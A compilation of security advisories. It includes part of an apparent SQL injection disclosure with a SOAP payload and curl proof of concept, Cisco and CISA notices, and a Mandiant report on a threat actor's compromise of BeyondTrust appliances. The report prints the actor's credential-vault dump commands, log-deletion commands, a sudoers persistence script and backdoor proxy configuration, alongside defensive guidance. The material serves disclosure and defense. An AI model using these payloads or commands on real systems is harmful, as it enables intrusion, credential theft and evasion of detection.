<tem:GetUser> <!--type: string--> <tem:sUserID>90';IF IS_SRVROLEMEMBER('sysadmin') = 1 WAITFOR DELAY '00:00:02';-- </tem:sUserID> </tem:GetUser> </soapenv:Body> </soapenv:Envelope> If the database user is sysadmin, SQL Ole Automation can be used to upload a file. If the database is running from the same server as the web application, ASPX files can be uploaded. They can then be browsed to run their code and perform system commands on the server. Proof-of-Concept (POC) Example: Curl POC: curl --path-as-is -i -s -k -X $'POST' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Soapaction: http://tempuri.org/GetCustomer' -H $'Content-Type: text/xml;charset=UTF-8' \ --data-binary $'<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\x0d\x0a <soapenv:Header/>\x0d\x0a <soapenv:Body>\x0d\x0a <tem:GetCustomer>\x0d\x0a <!--type: string-->\x0d\x0a <tem:sCustID>90\'; { YOUR_SQL_STATEMENT_HERE } ;-- </tem:sCustID>\x0d\x0a </tem:GetCustomer>\x0d\x0a </soapenv:Body>\x0d\x0a</soapenv:Envelope>' \ $'https://{target_host}/preapproval.asmx' Remediation Block access to /preapproval.asmx . Disclosure Timeline July 13 2026 : Issue discovered by Marcus Chang, and exploitation reported to the Vector Command customer. August 28, 2026: Initial contact with Channel Software. September 8, 15, and 29, 2026: Follow up email sent to Channel Software to confirm initial contact and provide details of the correct channel to share the details of the vulnerability. October 9, 2026: Follow up email sent to Channel Software informing them of public disclosure on October 14 and assignment of CVE, along with a request for a vendor statement. Rapid7 received no response from Channel Software. October 14, 2026: Public disclosure via publication of this blog post.

summary:
A vulnerability in the Advanced Malware Protection (AMP) feature of Cisco Secure Email Gateway could allow an unauthenticated, remote attacker to write arbitrary files on the underlying operating system. This vulnerability is due to improper handling of email attachments when the file reputation service is enabled. An attacker could exploit this vulnerability by sending an email that contains a crafted attachment through an affected device. A successful exploit could allow the attacker to write arbitrary files and execute commands with root privileges on the underlying operating system. Cisco has released software updates that address this vulnerability. There are no workarounds that address this vulnerability. This advisory is available at the following link: https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-esa-afw-zqYJkjxp For further documentation of improvements and fixes in Cisco Secure Email Gateway, see Cisco Secure Email Gateway and Secure Email and Web Manager Security Hardening Release: September 2026 .
Security Impact Rating: Critical
CVE: CVE-2026-76519

summary: CISA has added one new vulnerability to its Known Exploited Vulnerabilities (KEV) Catalog , based on evidence of active exploitation. CVE-2026-21589 Atlassian Multiple Products Files or Directories Accessible to External Parties Vulnerability This type of vulnerability is a frequent attack vector for malicious cyber actors and poses significant risks to the federal enterprise. Binding Operational Directive (BOD) 26-04: Prioritizing Security Updates Based on Risk establishes vulnerability management requirements for Federal Civilian Executive Branch (FCEB) agencies. BOD 26-04 reinforces the importance of the KEV Catalog and requires federal agencies to prioritize rapid remediation of high-risk vulnerabilities, specifically those identified by Common Vulnerabilities and Exposures (CVEs) listed in CISA’s KEV Catalog on publicly exposed assets that grant total control of the asset post-exploitation, while deferring action for lower-risk vulnerabilities. BOD 26-04 further establishes basic expectations for when agencies must check whether threat actors compromised the system before the patch was applied. While BOD 26-04 applies only to FCEB agencies, CISA encourages all organizations to adopt risk-based vulnerability management and prioritize remediation of KEV Catalog vulnerabilities . CISA will continue to add vulnerabilities to the catalog that meet the specified criteria . Aware of an exploited vulnerability not currently listed in the KEV Catalog? Submit it for potential addition through CISA’s KEV Nomination Form . Potential KEV additions must have a CVE ID, evidence of exploitation, and clear mitigation guidance.

summary: Written by: Jayson Frost, Bryce Greathouse, Brian Meyer, John Palmisano, Rajesh Rajeshirke, Steve Rasch, John Wolfram Introduction On October 15, BeyondTrust disclosed a vulnerability, CVE-2026-102764, impacting BeyondTrust Remote Support (formerly Bomgar) appliances. BeyondTrust Remote Support is an enterprise secure remote access solution that enables IT teams to securely access and troubleshoot remote endpoints. The successful exploitation of this vulnerability results in the arbitrary upload of files. During an incident response engagement, Mandiant identified evidence that ARMORY CASTLE, a suspected PRC-nexus espionage threat actor (formerly tracked as UNC5221 ), exploited this vulnerability as a zero-day, in late August 2026. This blog describes how ARMORY CASTLE escalated privileges and established persistent access to compromised BeyondTrust Remote Support appliances following exploitation of CVE-2026-102764, and provides actionable guidance for defenders. Organizations should prepare for potential widespread exploitation following this disclosure, as ARMORY CASTLE and other threat actors have historically conducted broad, opportunistic exploitation once the vulnerability becomes public. Exploitation Mandiant identified evidence of CVE-2026-102764 exploitation within the access, syslog, messages, thin-scc, brain and SSL log files, which are only accessible via an LUKS-encrypted partition which contains the /home directory. We strongly recommend that affected organizations immediately apply the security patches provided by BeyondTrust to remediate the vulnerability, and review additional guidance in their blog . Post-Exploitation Following the successful exploitation of CVE-2026-102764, Mandiant observed ARMORY CASTLE leverage multiple distinct TTPs to establish a foothold, escalate privileges, and enable lateral movement. Throughout the intrusion, ARMORY CASTLE leveraged a deep understanding of BeyondTrust appliance internals, as evidenced by their abuse of proprietary CLI utilities, startup configuration templates and local reverse-proxy routing. The threat actor used newly identified custom malware, the SAWFLY webshell and the BARECLAW tunneler to interact with the BeyondTrust device. Additionally, the actor routinely deleted appliance logs and endpoint artifacts to maintain access and evade detection. Figure 1: ARMORY CASTLE BeyondTrust compromise sequence of events Staging Webshell After successful exploitation of CVE-2026-102764, ARMORY CASTLE initiated POST requests to /app_84304470%2Ephp . Mandiant was unable to recover the file associated with the POST requests. Approximately 11 minutes following the initial POST request, the file system recorded the creation of the SAWFLY webshell at the web root path /%SITE_SERVICE_ACCOUNT%/ingredi/app/laravel/public/ . ARMORY CASTLE leveraged the SAWFLY webshell as one of their primary footholds within the environment over the course of the intrusion. SAWFLY Webshell SAWFLY ( mangoapi.php ) is an obfuscated, lightweight PHP webshell that implements bidirectional encrypted C2 communication using a custom Base32 transport layer and a 256-bit RC4 stream cipher. The webshell inspects incoming HTTP POST requests for the obfuscated parameter _c94mfe . If the parameter is absent, the script immediately sets HTTP status 404 Not Found ( http_response_code(404) ) and exits to evade automated web crawlers and vulnerability scanners. When the _c94mfe parameter is supplied, the webshell Base32-decodes the payload, decrypts it using RC4 with a hardcoded 32-byte key and executes the resulting PHP code via @eval() . Any non-null return value from the evaluated code is RC4-encrypted with the same key, Base32-encoded, and echoed back to the client. Privilege Escalation via SUID Bit Permissions The SAWFLY webshell ran under the site's service account, an unprivileged local user. To escalate privileges, the threat actor copied the system shell executable ( /bin/sh ) to the file /usr/bin/dbus-authd . The threat actor then modified the file's ownership to root and enabled Set User ID (SUID) permissions. When a binary has SUID permissions enabled, it executes with the privileges of the file's owner (root) rather than the user running the command, effectively granting the threat actor a persistent root-level backdoor on the host system. After establishing a foothold through the web shell, the actor elevated from the web service account to root-level control of the appliance host. This gave them access to every credential the appliance stored or brokered and the ability to modify files that survive reboot and configuration reset. Credential Harvesting: BeyondTrust Vault Extraction Mandiant observed the threat actor attempt to harvest credentials directly from the appliance's native secrets management database. To achieve this, the actor leveraged the /ns/sbin/bt-secrets binary which is a proprietary, administrative Command Line Interface (CLI) utility native to BeyondTrust appliances used to manage, store, and retrieve passwords, API keys, and endpoint credentials. The threat actor systematically iterated through several CLI syntax variations to locate and dump the appliance's credential vault: /ns/sbin/bt-secrets get -p %SITE_SERVICE_ACCOUNT% vault /ns/sbin/bt-secrets get %SITE_SERVICE_ACCOUNT% vault /ns/sbin/bt-secrets get vault Figure 2: Recovered Commands from message logs First, the threat actor attempted to target the vault for a specific site service account in order to pull passwords and keys assigned exclusively to that profile. Next, they issued a fallback command, targeting the global, appliance-level password safe to dump all stored administrative credentials. The threat actor concluded their interaction with the bt-secrets binary by forcibly removing the records stored i n /home/bomgar/log/bt-secrets.log and any archived files. /usr/sbin/sh -c 'rm -f /home/bomgar/log/bt-secrets.log /home/bomgar/log/bt-secrets.log.* 2>/dev/null;' Figure 3: Recovered Commands from message logs Persistence For long-term persistent access, Mandiant observed the threat actor target the BeyondTrust configuration templates to grant passwordless root privileges to the site service account. First, the threat actor created the /home/bomgar/sbin/post_boot.d directory, which is reserved for scripts executed automatically at system startup. Within this directory, they created a shell script named zz-root-persist . The contents of the zz-root-persist script indicate that it first checks if the user account is already granted passwordless root privileges within the /ns/config/sudoers.template file. If the entry is missing, the script appends '%SITE_SERVICE_ACCOUNT% ALL=(ALL) NOPASSWD: ALL' to the template. This entry added to the sudoers template grants the site user account passwordless administrative privileges to execute any command on the host system. Finally, the script executes '/ns/sbin/bt-sysconfig' --no-restart misc , which forces the appliance backend to immediately parse /ns/config/sudoers.template and rebuild the active /etc/sudoers file. This strategy ensures the threat actor's privilege escalation survives system reboots and configuration resets, which would normally overwrite manual changes made directly to /etc/sudoers . #!/bin/bash grep -qF '%SITE_SERVICE_ACCOUNT% ALL=(ALL) NOPASSWD: ALL' '/ns/config/sudoers.template' || echo '%SITE_SERVICE_ACCOUNT% ALL=(ALL) NOPASSWD: ALL' >> '/ns/config/sudoers.template' '/ns/sbin/bt-sysconfig' --no-restart misc Figure 4: Contents of zz-root-persist Anti-Forensics Throughout their unauthorized access to the appliance, Mandiant observed multiple instances where the threat actor attempted to impair defenses and hinder detection by systematically deleting system, web server, and application-level logs. Originating from the SAWFLY webshell, the threat actor executed the following command using elevated sudo privileges to delete active logs across both host and site-specific directories: 'rm -f \'/ns/log/auth.log\' \'/ns/log/ssl.log\' \'/ns/log/proto-handler.log\' \'/ns/log/bt-docker.log\' \'/ns/log/http-access.log\' \'/ns/log/http-errors.log\' \'/ns/log/php-fpm.log\' \'/ns/log/php-fpm-access.log\' \'/ns/log/php_debug.log\' \'/ns/log/php_web_errors.log\' \'/var/log/messages\' \'/home/%SITE_SERVICE_ACCOUNT%/ingredi/log/httpd_access.log\' \'/home/%SITE_SERVICE_ACCOUNT%/ingredi/log/httpd_error.log\' /tmp/sshauth.*' Figure 5: Recovered Command Lateral Movement: BeyondTrust Admin Session Abuse After the compromise of the BeyondTrust device, the threat actor pivoted into the BeyondTrust Remote Support application to perform reconnaissance via compromised Administrator credentials. First, the threat actor leveraged the Administrator account to log into the web administrative portal. { "event": "login", "status": "success", "target": "web/login", "who": "[REDACTED_USERNAME] using password", "who_ip": "[REDACTED_IP]" } Figure 6: BeyondTrust Syslog Entry After testing their initial access and verifying their ability to temporarily join the native Administrators group policy, the threat actor altered their strategy for long-term persistence. The actor directly modified the compromised account's permissions, upgrading both local Jump Items and Team permissions from No Access to Administrator . Jump Items are individual systems or devices that are made available for remote access within a Jump Group, enabling administrators to organize and control access to remote systems. This configuration change granted the threat actor permanent, unrestricted authorization to launch remote sessions to downstream systems populated within the appliance's Jump Item list. { "event": "user_changed", "old_username": "[REDACTED]", "old_permissions:jump_item_role:default:id": 1, "new_permissions:jump_item_role:default:id": 3, "old_permissions:jump_item_role:default:name": "No Access", "new_permissions:jump_item_role:default:name": "Administrator", "old_permissions:jump_item_role:teams:id": 1, "new_permissions:jump_item_role:teams:id": 3, "old_permissions:jump_item_role:teams:name": "No Access", "new_permissions:jump_item_role:teams:name": "Administrator" } Figure 7: BeyondTrust Syslog Entry Internal Reconnaissance Once the threat actor obtained elevated administrative privileges, Mandiant observed the threat actor establish a remote support session to target internal endpoints. Once connected, the threat actor leveraged the appliance’s built-in support tools to request and obtain full file-system access. The threat actor utilized the native BeyondTrust Remote Support file transfer service to download and exfiltrate sensitive internal documents useful for network reconnaissance, such as software inventories, directly from the user's desktop environment. BARECLAW Tunneler Mandiant observed the threat actor tunnel traffic through the BeyondTrust device via a custom SOCKS5 proxy tunneler. BARECLAW is a tunneler written in C that provides a SOCKS5 proxy service carried over the WebSocket transport and relays TCP connections between a remote client and destinations. BARECLAW statically embeds a CivetWeb WebServer to supply its HTTP and WebSocket functionality and utilizes OpenSSL for TLS. BARECLAW is configurable and provides the option to require authentication, to encrypt data between the client and tunneler, to restrict reachable destinations to specific CIDR ranges, to chain traffic to an upstream proxy, and to modify its default WebSocket endpoint and listening ports. TLS is enabled by providing a PEM certificate while authentication, encryption, destination filtering, and TLS are disabled by default. BARECLAW receives its configuration through CLI input and it provides a CLI option menu: Usage: %s [options] --listen PORT plain ws port (default 8080) --listen-tls PORT wss port (default 8443, needs --ssl-cert) --ssl-cert FILE PEM certificate (enables wss) --token STRING shared secret (?token= auth + obfs seed) --obfs enable XOR stream obfuscation --timeout SEC idle timeout (default 300) --connect-timeout SEC target connect timeout (default 10) --max-tunnels N concurrent tunnel limit (default 100) --allow-net CIDR allowed target subnet (repeatable) --upstream [socks5://]host:port route via upstream SOCKS5 --threads N civetweb worker threads (default 64) --ws-path PATH websocket endpoint path (default /wsproxy) -q, --quiet zero output (all logging suppressed) -h this help Figure 8: BARECLAW CLI Option Menu The threat actor executed BARECLAW through the following command line arguments: /tmp/ingredi_ws --listen 19800 --token %REDACTED% --obfs -q --ws-path /uidchanarge Figure 9: BARECLAW full Command-Line Arguments This command line configures BARECLAW to listen on TCP port 19800 and create the WebSocket endpoint /uidchanarge on the victim system. Clients are required to authenticate using the token specified in the command line arguments while the -q argument suppresses the tunneler’s logging. Tunneled data is encrypted with an XOR-based routine derived from that token and an 8-byte value provided by the client at the start of the session. The lack of the --ssl-cert and --listen-tls arguments in the CLI options means TLS was not enabled in this specific instance. Modifications to Haproxy.conf In addition to the creation of the BARECLAW tunneler, Mandiant observed the threat actor modify the /ns/config/haproxy.conf file in order for BARECLAW to be accessible directly from the internet. The HAProxy service running on BeyondTrust devices acts a reverse proxy for the device that accepts incoming requests on behalf of the BeyondTrust server and forwards the request to the appropriate backend services running on the local system (such as web interfaces, administration portals, or application gateways) based on the request's port or URL path. The haproxy.conf file is the primary configuration script that dictates how the BeyondTrust appliance handles, routes, and secures incoming traffic. The threat actor modifications first established an Access Control List (ACL) named wswsws to monitor incoming traffic for the specific URI path /uidchanarge . When a request matching this path is detected, HAProxy bypasses normal appliance web services and routes the traffic to a custom backend designated as webskd3 . acl wswsws path /uidchanarge use_backend webskd3 if wswsws Figure 10: ACL Modification to haproxy.conf Next, the webskd3 backend routes the incoming web stream locally (127.0.0.1 / localhost) to TCP port 19800, where the BARECLAW utility is actively listening. This local-only binding ensures that the backdoor listener remains completely hidden from external network scans, as it can only be reached internally via HAProxy's local redirection. backend webskd3 mode http server websocks5srv 127.0.0.1:19800 option http-keep-alive timeout server 28s timeout tunnel 5h Figure 11: Backend Route Modification to haproxy.conf Attribution GTIG attributes the zero-day exploitation of CVE-2026-102764 and the subsequent deployment of SAWFLY and BARECLAW to the suspected PRC-nexus espionage actor ARMORY CASTLE (formerly tracked as UNC5221). The tooling and TTPs leveraged within this intrusion align with previously observed activity from ARMORY CASTLE. GTIG has previously reported ARMORY CASTLE exploiting multiple vulnerabilities in edge appliances and deploying an extensive suite of custom tooling to support their objectives, ranging from passive backdoors and webshells to trojanized components of edge devices. ARMORY CASTLE has been active as early as October 2023 and has targeted a wide range of countries and verticals during their operations. Outlook and Implications In past campaigns, ARMORY CASTLE has conducted widespread and opportunistic exploitation following the public disclosure of vulnerabilities it had exploited selectively as zero-days, racing to infiltrate target organizations before patches are deployed. It is possible that we will observe similar widespread exploitation attempts associated with CVE-2026-102764. GTIG assesses with high confidence that ARMORY CASTLE will continue to leverage zero-day vulnerabilities in edge devices to gain access to environments to support their espionage objective. Defenders should also prepare for the possibility that following disclosure of CVE-2026-102764, ARMORY CASTLE may conduct widespread exploitation similar to what GTIG observed in 2024 following the disclosure of CVE-2023-46805 and CVE-2024-21887. Remediation and Hardening Organizations that have not yet applied the BT26-05 patch should immediately assess their exposure and risk, and review additional guidance from BeyondTrust in their blog . CVE-2026-102764 affects all supported Remote Support versions up to 26.2.3 and allows an unauthenticated remote attacker to perform file operations on the appliance, which can lead to host-level control and access to every credential the appliance stores or brokers. Any appliance that was reachable from the internet on a vulnerable version during the exploitation window should be treated as potentially compromised until it has been reviewed. Mandiant recommends a phased, patch-first approach that balances containment against disruption to support operations. Immediate Mitigation Organizations should choose among the following options based on their risk tolerance, evidence of compromise, and operational needs. Option 1: Apply the BT26-05 Patch (Mandiant Recommended) Remote Support SaaS : BeyondTrust applied the patch to all SaaS tenants on October 9, 2026. No customer action is required for the appliance itself. The credential and configuration steps in Option 3 still apply. Self-hosted, version 24.3.1 or later : Apply the BT26-05-RS patch from the /appliance interface, or confirm it was applied automatically if the appliance is subscribed to automatic updates. Self-hosted, older than 24.3.1 : Upgrade to a supported version, then apply the patch. Upgrading closes the vulnerability but does not remediate prior exposure. If the patch is not visible in /appliance , open a case with BeyondTrust Support referencing BT26-05. Option 2: Isolate Compromised or Suspected Appliances Preserve before acting : Snapshot virtual appliances with memory and export the disk before any change or reboot. For B Series hardware and SaaS tenants, request forensic preservation through BeyondTrust Support. Collect syslog, reverse-proxy or WAF, and perimeter firewall logs for the full exposure window, since an attacker with host access can delete on-appliance logs. Mandiant determined that the actor removed logs throughout the incident. Isolate at the perimeter : Block inbound traffic to the appliance's public address at the firewall rather than in /appliance , so the configuration remains intact for review. Restrict egress : Deny outbound traffic except to BeyondTrust update and licensing endpoints, and log every denied connection. Terminate access paths : End active support sessions and disable new sessions, Jump Clients, Jumpoints, and API accounts from /login . Disable rather than delete so the audit trail survives. Rebuild rather than clean : Redeploy appliances with confirmed or unknown compromise status from a clean, fully patched image. Customers cannot audit the appliance host file system, and host-level persistence survives reboot and configuration reset. Restore only a configuration backup dated before the exposure window, or restore the newest backup while isolated and complete the review in Option 3, Part B, before reconnecting anything. Issue a new TLS certificate and redeploy Jump Clients, Jumpoints, and the representative console from the rebuilt appliance. Note : Isolation and session termination interrupt support operations. Organizations should coordinate with help desk and vendor-support stakeholders before proceeding. Option 3: Apply Targeted Compensating Controls The following controls reduce exposure and limit post-exploitation impact. They do not substitute for the patch. Part A: Network Restrictions Restrict access to the /login and /appliance administrative interfaces by IP or network segment at the appliance level. Only representative console, customer portal, and Jump Client traffic should be reachable from the internet. Where operationally possible, place a reverse proxy or WAF with full URI logging in front of the appliance to keep a record of request paths that the appliance cannot alter. Part B: Credential Rotation and Configuration Review Revoke sessions and enrollments : End all active support sessions, then redeploy Jump Clients, Jumpoints, and the representative console from the patched or rebuilt appliance to invalidate existing tokens. Rotate credentials in dependency order : /appliance administrative credentials; /login administrators and local users; API client secrets; security provider bind accounts and SAML signing keys; Remote Support Vault and integrated Password Safe or Privileged Remote Access (PRA) credentials, rotated at the target system; integration credentials (SMTP, syslog, Information Technology Service Management (ITSM) connectors, outbound event secrets); and any credential typed into a support session during the window. Review the /login configuration against a pre-window baseline : user and role changes, particularly Jump Item roles raised to Administrator; group and session policies; API accounts; security providers; Jump Items and Jumpoints; and outbound event or syslog destinations. Remove anything without a change record or a named owner. Review support session reports for the window, including file transfers, to establish which endpoints were accessed and what left them. Every endpoint touched is in scope for downstream hunting. Note : Rotate credentials only after the appliance has been patched or rebuilt. Rotating earlier exposes the new credentials to an attacker who still controls the appliance. Part C: Control Plane Restrictions Require SAML single sign-on with phishing-resistant MFA for all /login users, and remove local accounts except one vaulted break-glass account with alerting on use. Ensure the built-in Admin account is configured with Multi-Factor Authentication (MFA) in accordance with the official BeyondTrust Two-Factor Authentication Guidelines . Set the default Jump Item role in every group policy to No Access, and grant roles through policy rather than per user. Scope API accounts to the minimum permission set, with a named automation owner for any account holding user or Jump Item management rights, and rotate API secrets on a schedule. Keep privileged credentials in Password Safe or an external vault with credential injection rather than in the Remote Support Vault, and store only non-interactive service account credentials on the appliance. Apply default-deny outbound filtering from the appliance, allowing only BeyondTrust endpoints and the organization's own syslog and directory servers. Part D: Logging and Detection Engineering Logging and Visibility Forward appliance syslog to a SIEM over TLS with retention that covers a multi-month exposure window, and collect reverse-proxy or WAF and perimeter firewall logs for the appliance's address. Export /login session, team activity, and user audit reports on a schedule. Detection Engineering Account and policy changes : user_changed events that raise a Jump Item or team role; user_added , api_account , and security_provider events with no change ticket; any change to outbound events or syslog destinations. Authentication : /login success from residential-broadband or commercial-VPN address space, and administrative logins outside business hours. Session activity : file-transfer events, and sessions started by accounts whose roles changed during the window. Request paths : at the reverse proxy or WAF, paths outside the known Remote Support path set, including unknown .php paths and WebSocket upgrades from outside support staff and endpoint address ranges. Anti-forensics: gaps in syslog forwarding from the appliance; an interruption bounded by a single session is a strong indicator of log tampering. Indicators of Compromise (IOCs) To assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a GTI Collection for registered users. summary: CISA is aware of critical authentication bypass vulnerability CVE-2026-102764 , affecting BeyondTrust Remote Support (formerly Bomgar) versions 26.2.3 and earlier. Patches are available for supported versions (24.3.1 and later); organizations using older versions must upgrade first. Cyber threat actors are actively exploiting the vulnerability to gain initial access, then establishing persistence, escalating privileges, and moving laterally. CISA added CVE-2026-102764 to its Known Exploited Vulnerabilities (KEV) catalog on Oct. 16, 2026. CISA urges organizations with affected self-hosted Remote Support appliances to immediately take the following actions: Apply the BT26-05-RS patch, as outlined in BeyondTrust’s Security Advisory BT26-05 . Organizations on a self-hosted Remote Support version older than 24.3.1 will need to upgrade to a newer version to apply the patch. Organizations using BeyondTrust-hosted (SaaS) Remote Support deployments have already been patched. Review BeyondTrust’s blog ARMORY CASTLE and BT26-05: What Security Teams Need to Know for detailed information on the vulnerability and recommended response and mitigation actions. Limit external access to the Remote Support appliance to the services needed to support users and customers. Restrict access to administrative interfaces to trusted networks. Review BeyondTrust’s B Series Appliance on-premises security for additional guidance on securing network connectivity for self-hosted Remote Support appliances. Organizations with affected self-hosted Remote Support appliances should conduct network and memory forensics to identify evidence of potential compromise. If your organization suspects a compromise, CISA recommends taking the following actions: Isolate any suspected or confirmed compromised appliances. Collect a snapshot of virtual appliances or forensic image for physical appliances to conduct future forensics, immediately forward appliance syslog and session events to the SIEM, and collect any additional logs, such as web application firewall, reverse-proxy, or perimeter firewall logs for the exposure window. Consult BeyondTrust’s Syslog guide for additional information on forwarding appliance logs and session events. Conduct network and forensic investigations for evidence of compromise. Additionally, hunt for indicators of threat actor activity, including unrecognized privileged or administrative sessions, unrecognized script files, unexpected gaps in logs or log forwarding, and unauthorized account, permission, or session-policy changes. Consult CISA’s Binding Operational Directive (BOD) 26-04: Implementation Guidance for Prioritizing Security Updates Based on Risk to assist with prioritizing vulnerability remediation. Rebuild from a known-good state and apply the BT26-05-RS patch. Then rotate every credential the appliance stored or injected, revoke all active support sessions, and review new multifactor authentication registrations on privileged accounts. CISA urges organizations to review the BeyondTrust security advisory and resources noted above and apply necessary updates. CISA also recommends reviewing Mandiant’s blog, ARMORY CASTLE Exploits BeyondTrust , for additional hunt and isolation guidance and detections. summary: CISA has added two new vulnerabilities to its Known Exploited Vulnerabilities (KEV) Catalog , based on evidence of active exploitation. CVE-2025-61624 Fortinet Multiple Products Path Traversal Vulnerability CVE-2026-102764 BeyondTrust Remote Support Authentication Bypass by Spoofing Vulnerability These types of vulnerabilities are a frequent attack vector for malicious cyber actors and pose significant risks to the federal enterprise. Binding Operational Directive (BOD) 26-04: Prioritizing Security Updates Based on Risk establishes vulnerability management requirements for Federal Civilian Executive Branch (FCEB) agencies. BOD 26-04 reinforces the importance of the KEV Catalog and requires federal agencies to prioritize rapid remediation of high-risk vulnerabilities, specifically those identified by Common Vulnerabilities and Exposures (CVEs) listed in CISA’s KEV Catalog on publicly exposed assets that grant total control of the asset post-exploitation, while deferring action for lower-risk vulnerabilities. BOD 26-04 further establishes basic expectations for when agencies must check whether threat actors compromised the system before the patch was applied. While BOD 26-04 applies only to FCEB agencies, CISA encourages all organizations to adopt risk-based vulnerability management and prioritize remediation of KEV Catalog vulnerabilities . CISA will continue to add vulnerabilities to the catalog that meet the specified criteria . Aware of an exploited vulnerability not currently listed in the KEV Catalog? Submit it for potential addition through CISA’s KEV Nomination Form . Potential KEV additions must have a CVE ID, evidence of exploitation, and clear mitigation guidance.
